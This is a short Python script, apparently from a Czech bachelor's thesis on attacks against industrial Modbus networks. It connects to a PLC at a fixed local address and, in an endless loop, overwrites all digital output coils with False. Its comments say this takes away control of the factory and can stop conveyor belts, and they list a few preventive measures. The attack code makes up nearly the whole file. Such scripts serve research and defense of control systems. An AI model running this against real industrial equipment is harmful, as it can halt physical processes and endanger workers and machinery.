# Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
# File name: attack-1.py 
# Authors: Jakub Kuzník <xkuzni04>
# institution: VUT FIT 
# Description: 



#########  UTOK
# Tento utok zahlti vsechny digital vystupy (ktere ridi chovani tovarny)
#    nulami, to znamena, ze nebude moznost cokoliv ridit. 
#    Muze to vest napriklad k zastaveni pasu .....


######### PREVENCE 
# - nepovolovat tcp spojeni ze vsech addres 
# - obvykle plc posilaji signaly na DO v nejakych intervalech napriklad 0.1s pokud se nekdo 
#   snazi vynulovavat DO velmi rychle melo by to jit videt ve statistikach netflow  
# - ssh klice (mozna) ???? 

from pickle import FALSE
from pyModbusTCP.client import ModbusClient

SERVER_HOST_2 = "192.168.88.252"  # PLC2
SERVER_PORT = 502



plc = ModbusClient()
plc.host(SERVER_HOST_2)
plc.port(SERVER_PORT)

plc.open()

### SPAM FALS on all DO 
while True:
    plc.write_multiple_coils(0, [False, False, False, False])




    